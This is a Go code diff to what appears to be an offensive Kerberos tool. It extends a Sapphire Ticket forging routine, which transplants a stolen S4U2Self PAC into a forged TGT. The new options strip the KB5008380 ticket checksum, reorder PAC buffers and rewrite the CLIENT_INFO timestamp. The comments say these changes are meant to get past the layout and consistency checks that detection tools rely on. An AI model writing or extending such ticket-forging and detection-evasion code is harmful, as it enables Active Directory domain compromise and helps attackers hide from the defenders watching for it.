@@ -198,6 +198,24 @@ type SapphireTicketRequest struct {
 	// measure. Removing it makes the PAC look like it came from a pre-KB5020805
 	// DC that doesn't emit the buffer at all.
 	StripFullChecksum bool
+
+	// StripTicketChecksum removes the PAC_TICKET_CHECKSUM buffer (type 16).
+	// KB5008380 anti-transplantation HMAC over the EncTicketPart; inherited from
+	// the stolen S4U2Self ticket and invalid in the forged TGT. WARNING: DCs in
+	// strict KB5008380 enforcement mode may reject tickets lacking this buffer.
+	StripTicketChecksum bool
+
+	// NormalizeBufferOrder reorders PAC buffers to match the canonical KDC-native
+	// layout (LOGON_INFO, CLIENT_INFO, UPN_DNS, SERVER_CHECKSUM, KDC_CHECKSUM,
+	// TICKET_CHECKSUM, FULL_CHECKSUM, ATTRIBUTES_INFO, REQUESTOR_SID). Goobeus's
+	// AddKB5008380Buffers inserts new buffers in a non-canonical order; detections
+	// that check layout ordering as a secondary IOC would flag the difference.
+	NormalizeBufferOrder bool
+
+	// SyncClientInfoTime rewrites CLIENT_INFO.ClientId FILETIME to match the
+	// forged TGT's AuthTime. Legit TGTs have these equal; sapphire inherits
+	// the S4U2Self issuance time instead. Consistency-check detections flag this.
+	SyncClientInfoTime bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -508,6 +526,56 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			fmt.Printf("[+] Removed PAC_FULL_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
 		} else {
 			fmt.Println("[!] No PAC_FULL_CHECKSUM buffer present (DC may pre-date KB5020805)")
+		}
+	}
+
+	// Step 3.79: Optionally remove PAC_TICKET_CHECKSUM (type 16) buffer.
+	// KB5008380 HMAC over EncTicketPart; inherited from S4U2Self, now stale
+	// after PAC transplantation. Removing makes the PAC look pre-KB5008380.
+	// WARNING: may cause auth failures on DCs in strict KB5008380 enforcement.
+	if req.StripTicketChecksum {
+		fmt.Println("[*] Step 3.79: Removing PAC_TICKET_CHECKSUM (type 16) buffer...")
+		before := len(stolenPAC)
+		var n int
+		stolenPAC, n = pac.RemovePACTicketChecksum(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Removed PAC_TICKET_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
+		} else {
+			fmt.Println("[!] No PAC_TICKET_CHECKSUM buffer present")
+		}
+	}
+
+	// Step 3.80: Optionally reorder PAC buffers to canonical KDC-native layout.
+	// Must run after all strip/add operations so reordering covers the final
+	// set of buffers. Must run BEFORE re-signing.
+	if req.NormalizeBufferOrder {
+		fmt.Println("[*] Step 3.80: Reordering PAC buffers to canonical KDC-native layout...")
+		var n int
+		stolenPAC, n = pac.NormalizePACBufferOrder(stolenPAC)
+		if n > 0 {
+			fmt.Println("[+] PAC buffers reordered")
+		} else {
+			fmt.Println("[=] PAC buffers already in canonical order")
+		}
+	}
+
+	// Step 3.81: Optionally sync CLIENT_INFO.ClientId FILETIME to the TGT's
+	// AuthTime. Legit TGTs have CLIENT_INFO.ClientId == EncTicketPart.AuthTime;
+	// sapphire inherits the S4U2Self issuance time which is seconds off. A
+	// consistency-check detection would flag the mismatch.
+	if req.SyncClientInfoTime {
+		fmt.Println("[*] Step 3.81: Syncing CLIENT_INFO FILETIME to ticket AuthTime...")
+		encTkt, err := decryptTGT(tgt, krbtgtKey, krbtgtEtype)
+		if err != nil {
+			fmt.Printf("[!] Could not decrypt TGT to extract AuthTime: %v\n", err)
+		} else {
+			var n int
+			stolenPAC, n = pac.SyncClientInfoTimestamp(stolenPAC, encTkt.AuthTime)
+			if n > 0 {
+				fmt.Printf("[+] Synced CLIENT_INFO ClientId to %s\n", encTkt.AuthTime.Format(time.RFC3339))
+			} else {
+				fmt.Println("[!] CLIENT_INFO buffer not present or too small")
+			}
 		}
 	}
 
